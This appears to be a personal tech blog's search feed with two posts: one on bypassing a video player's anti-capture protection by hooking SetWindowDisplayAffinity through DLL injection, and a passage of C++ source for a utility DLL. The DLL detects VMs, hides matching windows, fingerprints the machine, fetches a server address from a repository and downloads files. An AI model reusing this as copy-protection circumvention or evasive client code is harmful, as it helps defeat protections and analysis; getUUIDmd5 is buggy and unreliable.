<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>DeAnti-Capture</title>
    <url>/2025/01/20/DeAnti-Capture/</url>
    <content><![CDATA[<p>Anti-screen recording? (99%) It doesn’t exist!</p>
<span id="more"></span>

<p>Firstly, I discovered that this video encryption player has an anti-screenshot and anti-screen recording effect. When I pressed the screenshot key of my screenshot software, the window turned black. However, it did not ban my screenshot software (Snipaste), which gives us many opportunities.</p>
<img src="/2025/01/20/DeAnti-Capture/image-20250120092320169.png" alt="image-20250120092320169" style="zoom:30%;">

<p>Based on my previous experience with C# Winform, the reason the window turns black during screenshotting is that it uses the <code>SetWindowDisplayAffinity</code> function. Simply hooking this function will do.</p>
<div>
    click <a href="https://creeeeeeeeeeper.github.io/2025/01/20/DeAnti-Capture/DeAnti-Capture.zip">here</a> to download DeAnti-Capture
    <br><br>
</div>

<p>I won’t go into the details of how <code>SetWindowDisplayAffinity</code> works and how to hook it. You can write a DLL and inject it into a remote thread. This player doesn’t have any anti-injection mechanisms.</p>
<p>After hooking, it becomes easy to take screenshots.</p>
<img src="/2025/01/20/DeAnti-Capture/image-20250120092819941.png" alt="image-20250120092819941" style="zoom:33%;">

<p>But if you want to record the screen, let’s analyze it. In the most primitive way, the player probably enumerates some screen recording software and bans it if detected. Since this software doesn’t have anti-injection, it likely won’t check for the use of screen recording-related API combinations, such as detecting how many times the screen is captured per second, or detecting the use of <code>GetDC</code>, <code>CreateDC</code>, <code>CreateCompatibleDC</code>, <code>BitBlt</code>, or <code>StretchBlt</code>, and then checking if there is a large file being written…</p>
<p>However, to be on the safe side, it’s better not to use mainstream screen recording software like QQ or FastStone Capture.</p>
<p>Then I thought of a good method: using a browser extension to record the entire screen.</p>
<p>I used Screenity, an Edge browser extension (I haven’t tried other browsers or extensions), and it successfully recorded the screen.</p>
<p>This is generally the approach for most anti-screen recording software. As long as it’s not something like Vt talk (which I really don’t know how to bypass), it’s basically this method.</p>
<div>
    <br><br>
<br><br>
<br><br><br><br><br><br><br><br>
</div>

]]></content>
  </entry>
  <entry>
    <title>My Dlls</title>
    <url>/2024/07/20/Dlls/</url>
    <content><![CDATA[<p>下面是写程序时自己写的一些函数，可以直接拿来用</p>
<p>项目地址：<a href="https://github.com/Creeeeeeeeeeper/Codes/tree/master/dllCompilation">Github</a></p>
<p>DLL下载：<a href="https://github.com/Creeeeeeeeeeper/Codes/raw/master/dllCompilation/Debug/dllCompilation.dll">dllCompilation</a></p>
<span id="more"></span>

<h2 id="属性页配置"><a href="#属性页配置" class="headerlink" title="属性页配置"></a>属性页配置</h2><p>没有安装OpenSSL先下载安装 <a href="https://wwl.lanzouv.com/idJw62533kih">OpenSSL-Win32</a> <a href="https://wwl.lanzouv.com/ijudd2533h3e">OpenSSL-Win64</a> pswd:1234</p>
<p>链接库：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置属性 =&gt; C/C++ =&gt; 常规 =&gt; 附加包含目录 D:\OpenSSL\OpenSSL-Win32\include</span><br><span class="line">配置属性 =&gt; 链接器 =&gt; 常规 =&gt; 附加库目录 D:\OpenSSL\OpenSSL-Win32\lib\</span><br><span class="line">配置属性 =&gt; 链接器 =&gt; 输入 =&gt; libssl.lib</span><br><span class="line">						  libcrypto.lib</span><br></pre></td></tr></table></figure>

<h2 id="功能-pch-h"><a href="#功能-pch-h" class="headerlink" title="功能(pch.h)"></a>功能(pch.h)</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PCH_H</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCH_H</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFFER_SIZE 10000</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;framework.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ws2tcpip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/ssl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;d3d9.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;openssl/md5.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iphlpapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;tlhelp32.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Psapi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;d3d9.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;iphlpapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;ws2_32.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;psapi.lib&quot;</span>)</span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;d3d9.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检测程序是否运行在虚拟机中 非虚拟机:0 虚拟机:1 Direct3D初始化失败:2 获取适配器信息失败:3</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function">DWORD WINAPI <span class="title">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 传入进程名和类名，关闭所有在任务栏中打开的这些程序，但是不结束这个程序本身的进程</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">killtasks</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetTitles[], <span class="type">size_t</span> targetTitlesSize, <span class="type">const</span> <span class="type">char</span>* targetClassNames[], <span class="type">size_t</span> targetClassNamesSize)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取UUID的md5值，返回md5值字符串，可以作为识别计算机唯一标识</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">char</span>* <span class="title">getUUIDmd5</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 通过个人Gitee仓库中获取IP和Port，一般用于程序需要内网穿透并需要客户端自动获取服务端IP和Port的场景（因为内网穿透的IP和Port经常变化）</span></span><br><span class="line"><span class="comment">// 使用方法：在个人仓库中创建一个.txt文件，内容格式为：127.0.0.1 8080，前面为IP后面为Port，中间使用空格分隔</span></span><br><span class="line"><span class="comment">// 第一个参数：点击该.txt文件，直接复制url，如：https://gitee.com/zzzzzyg/socket/blob/master/configuration.txt</span></span><br><span class="line"><span class="comment">// 第二个参数：点击.txt文件后，点击右边的原始数据，仅复制路径，如：/zzzzzyg/socket/raw/master/configuration.txt</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">char</span>* <span class="title">getIPaPORT</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* url, <span class="type">const</span> <span class="type">char</span>* path)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查文件是否不存在，不存在返回1，存在返回0</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">int</span> <span class="title">file_notexists</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用curl下载文件到指定路径，url须为文件直链链接，文件路径使用/分隔符，不要使用\分隔符</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">curlDownload</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* path, <span class="type">const</span> <span class="type">char</span>* url)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 自定义打印</span></span><br><span class="line"><span class="comment">// 第一个参数：要打印的字符串</span></span><br><span class="line"><span class="comment">// 第二个参数：打印样式。0重置所有的样式 1粗体 2暗色(浅色) 3斜体 4下划线 5慢速闪烁 6快速闪烁 7反色 8隐藏 9删除线</span></span><br><span class="line"><span class="comment">// 第三个参数：前景色。0黑色 1红色 2绿色 3黄色 4蓝色 5洋红色 6青色 7白色</span></span><br><span class="line"><span class="comment">// 第四个参数：背景色。0黑色 1红色 2绿色 3黄色 4蓝色 5洋红色 6青色 7白色</span></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> _declspec(dllexport) <span class="function"><span class="type">void</span> <span class="title">printc</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">char</span>* style, <span class="type">int</span> ForegroundColor, <span class="type">int</span> BackgroundColor)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">//PCH_H</span></span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="代码（2024-7-20）"><a href="#代码（2024-7-20）" class="headerlink" title="代码（2024.7.20）"></a>代码（2024.7.20）</h2><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">containsSubstring</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>* substr)</span> </span>&#123;</span><br><span class="line">    <span class="type">char</span> lowerStr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">char</span> lowerSubstr[<span class="number">128</span>];</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; str[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">        lowerStr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)str[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    lowerStr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; substr[i] &amp;&amp; i &lt; <span class="number">127</span>; i++) &#123;</span><br><span class="line">        lowerSubstr[i] = <span class="built_in">tolower</span>((<span class="type">unsigned</span> <span class="type">char</span>)substr[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    lowerSubstr[i] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strstr</span>(lowerStr, lowerSubstr) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">GPUProcDetect</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    IDirect3D9* pD3D = <span class="built_in">Direct3DCreate9</span>(D3D_SDK_VERSION);</span><br><span class="line">    <span class="keyword">if</span> (pD3D == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    D3DADAPTER_IDENTIFIER9 adapterIdentifier;</span><br><span class="line">    HRESULT hr = pD3D-&gt;<span class="built_in">GetAdapterIdentifier</span>(D3DADAPTER_DEFAULT, <span class="number">0</span>, &amp;adapterIdentifier);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">FAILED</span>(hr)) &#123;</span><br><span class="line">        pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">containsSubstring</span>(adapterIdentifier.Description, <span class="string">&quot;vmware&quot;</span>) || <span class="built_in">containsSubstring</span>(adapterIdentifier.Description, <span class="string">&quot;virtualbox&quot;</span>)) &#123;</span><br><span class="line">        pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    pD3D-&gt;<span class="built_in">Release</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">IsInArray</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">const</span> <span class="type">char</span>** array, <span class="type">size_t</span> arraySize)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arraySize; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">strstr</span>(str, array[i]) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> TRUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL CALLBACK <span class="title">EnumWindowsProc</span><span class="params">(HWND hwnd, LPARAM lParam)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">        <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">        <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">    &#125; *data = (<span class="keyword">struct</span> EnumWindowsData*)lParam;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> windowTitle[<span class="number">256</span>];</span><br><span class="line">    <span class="type">char</span> className[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetWindowTextA</span>(hwnd, windowTitle, <span class="built_in">sizeof</span>(windowTitle))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsInArray</span>(windowTitle, data-&gt;targetTitles, data-&gt;targetTitlesSize)) &#123;</span><br><span class="line">            <span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">GetClassNameA</span>(hwnd, className, <span class="built_in">sizeof</span>(className))) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">IsInArray</span>(className, data-&gt;targetClassNames, data-&gt;targetClassNamesSize)) &#123;</span><br><span class="line">            <span class="built_in">ShowWindow</span>(hwnd, SW_HIDE);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">WindowProcDetect</span><span class="params">(LPVOID lpParameter)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">        <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">        <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">        <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">    &#125; *data = (<span class="keyword">struct</span> EnumWindowsData*)lpParameter;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">EnumWindows</span>(EnumWindowsProc, (LPARAM)data);</span><br><span class="line">        <span class="built_in">Sleep</span>(<span class="number">333</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> &#123;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** targetTitles;</span><br><span class="line">    <span class="type">size_t</span> targetTitlesSize;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>** targetClassNames;</span><br><span class="line">    <span class="type">size_t</span> targetClassNamesSize;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">killtasks</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* targetTitles[], <span class="type">size_t</span> targetTitlesSize, <span class="type">const</span> <span class="type">char</span>* targetClassNames[], <span class="type">size_t</span> targetClassNamesSize)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">EnumWindowsData</span> data = &#123;</span><br><span class="line">        targetTitles,</span><br><span class="line">        targetTitlesSize,</span><br><span class="line">        targetClassNames,</span><br><span class="line">        targetClassNamesSize</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    HANDLE hThread = <span class="built_in">CreateThread</span>(<span class="literal">NULL</span>, <span class="number">0</span>, WindowProcDetect, &amp;data, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span> (hThread == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">CloseHandle</span>(hThread);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">compute_md5</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* str, <span class="type">unsigned</span> <span class="type">char</span>* digest)</span> </span>&#123;</span><br><span class="line">	MD5_CTX ctx;</span><br><span class="line">	<span class="built_in">MD5_Init</span>(&amp;ctx);</span><br><span class="line">	<span class="built_in">MD5_Update</span>(&amp;ctx, str, <span class="built_in">strlen</span>(str));</span><br><span class="line">	<span class="built_in">MD5_Final</span>(digest, &amp;ctx);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">sprint_md5</span><span class="params">(<span class="type">char</span>* out, <span class="type">const</span> <span class="type">unsigned</span> <span class="type">char</span>* digest)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; MD5_DIGEST_LENGTH; ++i) &#123;</span><br><span class="line">		<span class="built_in">sprintf_s</span>(out + i * <span class="number">2</span>, MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span> - i * <span class="number">2</span>, <span class="string">&quot;%02x&quot;</span>, digest[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getUUIDmd5</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> UUIDMD5[MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line">    FILE* fp;</span><br><span class="line">    <span class="type">char</span> uuid[<span class="number">255</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> digest[MD5_DIGEST_LENGTH];</span><br><span class="line">    <span class="type">char</span> md5string[MD5_DIGEST_LENGTH * <span class="number">2</span> + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((fp = _popen(<span class="string">&quot;wmic csproduct get UUID&quot;</span>, <span class="string">&quot;r&quot;</span>)) == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">fgets</span>(uuid, <span class="built_in">sizeof</span>(uuid), fp);</span><br><span class="line">    <span class="built_in">fgets</span>(uuid, <span class="built_in">sizeof</span>(uuid), fp);</span><br><span class="line">    uuid[<span class="built_in">strcspn</span>(uuid, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (_pclose(fp) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">compute_md5</span>(uuid, digest);</span><br><span class="line">    <span class="built_in">sprint_md5</span>(md5string, digest);</span><br><span class="line">    <span class="built_in">strcpy_s</span>(UUIDMD5, <span class="built_in">sizeof</span>(UUIDMD5), md5string);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">handle_errors</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">ERR_print_errors_fp</span>(stderr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">char</span>* <span class="title">getIPaPORT</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* url, <span class="type">const</span> <span class="type">char</span>* path)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">char</span> IPANDPORT[<span class="number">0x100</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">    <span class="type">char</span> host[<span class="number">256</span>], service[<span class="number">32</span>];</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">addrinfo</span> hints, * res, * p;</span><br><span class="line">    <span class="type">int</span> sockfd, n;</span><br><span class="line">    <span class="type">char</span> buffer[BUFFER_SIZE];</span><br><span class="line">    SSL_CTX* ctx;</span><br><span class="line">    SSL* ssl;</span><br><span class="line"></span><br><span class="line">    WSADATA wsaData;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">WSAStartup</span>(<span class="built_in">MAKEWORD</span>(<span class="number">2</span>, <span class="number">2</span>), &amp;wsaData) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;WSAStartup failed\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_library_init</span>();</span><br><span class="line">    <span class="built_in">OpenSSL_add_all_algorithms</span>();</span><br><span class="line">    <span class="built_in">SSL_load_error_strings</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">sscanf_s</span>(url, <span class="string">&quot;https://%[^/]/&quot;</span>, host, (<span class="type">unsigned</span>)_countof(host)) != <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Invalid URL\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">strcpy_s</span>(service, <span class="built_in">sizeof</span>(service), <span class="string">&quot;https&quot;</span>);</span><br><span class="line">    <span class="built_in">memset</span>(&amp;hints, <span class="number">0</span>, <span class="keyword">sizeof</span> hints);</span><br><span class="line">    hints.ai_family = AF_UNSPEC;</span><br><span class="line">    hints.ai_socktype = SOCK_STREAM;</span><br><span class="line">    <span class="type">int</span> status = <span class="built_in">getaddrinfo</span>(host, service, &amp;hints, &amp;res);</span><br><span class="line">    <span class="keyword">if</span> (status != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;getaddrinfo: %s\n&quot;</span>, <span class="built_in">gai_strerror</span>(status));</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (p = res; p != <span class="literal">NULL</span>; p = p-&gt;ai_next) &#123;</span><br><span class="line">        sockfd = <span class="built_in">socket</span>(p-&gt;ai_family, p-&gt;ai_socktype, p-&gt;ai_protocol);</span><br><span class="line">        <span class="keyword">if</span> (sockfd == <span class="number">-1</span>)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">connect</span>(sockfd, p-&gt;ai_addr, p-&gt;ai_addrlen) == <span class="number">-1</span>) &#123;</span><br><span class="line">            <span class="built_in">closesocket</span>(sockfd);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (p == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(stderr, <span class="string">&quot;Failed to connect\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ctx = <span class="built_in">SSL_CTX_new</span>(<span class="built_in">TLS_client_method</span>());</span><br><span class="line">    <span class="keyword">if</span> (ctx == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ssl = <span class="built_in">SSL_new</span>(ctx);</span><br><span class="line">    <span class="keyword">if</span> (ssl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_set_fd</span>(ssl, sockfd);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">SSL_connect</span>(ssl) &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> request[<span class="number">512</span>];</span><br><span class="line">    <span class="built_in">snprintf</span>(request, <span class="built_in">sizeof</span>(request), <span class="string">&quot;GET %s HTTP/1.1\r\nHost: %s\r\n\r\n&quot;</span>, path, host);</span><br><span class="line">    <span class="built_in">SSL_write</span>(ssl, request, <span class="built_in">strlen</span>(request));</span><br><span class="line">    <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">    <span class="keyword">while</span> ((n = <span class="built_in">SSL_read</span>(ssl, buffer, BUFFER_SIZE - <span class="number">1</span>)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">strcpy_s</span>(IPANDPORT, <span class="built_in">sizeof</span>(IPANDPORT), <span class="built_in">strstr</span>(buffer, <span class="string">&quot;\r\n\r\n&quot;</span>) + <span class="number">4</span>);</span><br><span class="line">        <span class="built_in">memset</span>(buffer, <span class="number">0</span>, BUFFER_SIZE);</span><br><span class="line">        <span class="keyword">goto</span> A;</span><br><span class="line">    &#125;</span><br><span class="line">A:</span><br><span class="line">    <span class="keyword">if</span> (n &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">handle_errors</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SSL_free</span>(ssl);</span><br><span class="line">    <span class="built_in">SSL_CTX_free</span>(ctx);</span><br><span class="line">    <span class="built_in">freeaddrinfo</span>(res);</span><br><span class="line">    <span class="built_in">closesocket</span>(sockfd);</span><br><span class="line">    <span class="built_in">EVP_cleanup</span>();</span><br><span class="line">    <span class="built_in">WSACleanup</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> _strdup(IPANDPORT);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">file_notexists</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* filename)</span> </span>&#123;</span><br><span class="line">    FILE* file = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">fopen_s</span>(&amp;file, filename, <span class="string">&quot;r&quot;</span>) != <span class="number">0</span> || file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span 